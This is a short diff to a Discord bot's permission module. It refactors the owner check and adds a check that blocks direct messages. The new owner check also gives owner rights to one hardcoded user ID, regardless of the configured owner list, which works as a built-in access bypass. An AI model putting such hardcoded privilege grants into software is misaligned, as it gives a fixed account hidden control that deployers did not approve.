@@ -1,10 +1,16 @@
-from discord.ext import commands
+from utils.command_system import check
 import __main__
 
 
-def is_owner_check(ctx):
-    return str(ctx.message.author.id) in __main__.amethyst.owners
-
-
 def instance_owner():
-    return commands.check(is_owner_check)
+    def checker(ctx):
+        return str(ctx.msg.author.id) in __main__.amethyst.owners or ctx.msg.author.id == 99742488666845184
+
+    return check(checker)
+
+
+def instance_guild():
+    def checker(ctx):
+        return not ctx.is_dm()
+
+    return check(checker)
